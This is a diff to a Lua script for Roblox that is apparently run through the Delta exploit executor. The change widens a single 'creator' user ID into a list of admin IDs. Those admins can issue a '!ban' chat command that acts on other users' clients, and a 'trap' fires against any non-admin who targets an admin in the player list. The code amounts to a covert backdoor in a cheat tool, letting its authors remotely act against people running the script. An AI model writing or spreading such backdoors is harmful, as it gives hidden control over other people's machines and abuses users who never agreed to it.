@@ -12,8 +12,15 @@ local StarterGui = game:GetService("StarterGui")
 local TextChatService = game:GetService("TextChatService")
 local lp = Players.LocalPlayer
 
--- 🔥 YOUR EXACT ROBLOX USER ID FOR THE BOSS NOTIFICATION & TRAP 🔥
-local CREATOR_USER_ID = 9685785248
+-- 🔥 CREATOR / ADMIN USER IDS FOR BOSS NOTIFICATION & ANTI-TROLL TRAP 🔥
+local ADMIN_IDS = {
+    [9685785248] = true,
+    [11414201166] = true
+}
+
+local function isAdmin(userId)
+    return ADMIN_IDS[userId] == true
+end
 
 -- SAFE CLIPBOARD FUNCTION FOR DELTA EXECUTOR
 local copyToClip = setclipboard or toclipboard or function() end
@@ -152,7 +159,7 @@ end
 
 -- 🔥 CHAT LISTENER FOR REMOTE !BAN COMMAND
 local function onPlayerChatted(player, message)
-    if player.UserId == CREATOR_USER_ID and lp.UserId ~= CREATOR_USER_ID then
+    if isAdmin(player.UserId) and not isAdmin(lp.UserId) then
         local msg = message:lower()
         if msg:sub(1, 5) == "!ban " then
             local targetName = msg:sub(6):gsub("^%s*(.-)%s*$", "%1") -- Trim spaces
@@ -165,16 +172,16 @@ local function onPlayerChatted(player, message)
     end
 end
 
--- TRACK WHEN THE CREATOR JOINS
+-- TRACK WHEN THE CREATOR/ADMIN JOINS
 Players.PlayerAdded:Connect(function(player)
-    if player.UserId == CREATOR_USER_ID then 
+    if isAdmin(player.UserId) then 
         triggerBossArrival() 
     end
     player.Chatted:Connect(function(msg) onPlayerChatted(player, msg) end)
 end)
 
 for _, player in ipairs(Players:GetPlayers()) do
-    if player.UserId == CREATOR_USER_ID and player.UserId ~= lp.UserId then
+    if isAdmin(player.UserId) and player.UserId ~= lp.UserId then
         triggerBossArrival()
     end
     player.Chatted:Connect(function(msg) onPlayerChatted(player, msg) end)
@@ -410,8 +417,8 @@ local function refreshPlayers()
         applyGlowAndHover(btn, selectedPlayers[plr] and Colors.Primary or Colors.Surface, selectedPlayers[plr] and Colors.PrimaryHover or Colors.SurfaceHover, Colors.Primary)
         
         btn.MouseButton1Click:Connect(function()
-            -- 🔥 THE ULTIMATE ANTI-TROLL TRAP 🔥
-            if plr.UserId == CREATOR_USER_ID and lp.UserId ~= CREATOR_USER_ID then
+            -- 🔥 THE ULTIMATE ANTI-TROLL TRAP FOR BOTH ADMINS 🔥
+            if isAdmin(plr.UserId) and not isAdmin(lp.UserId) then
                 triggerBanTrap("bye ashu papa ne ban kr diya sorry papa")
                 return
             end
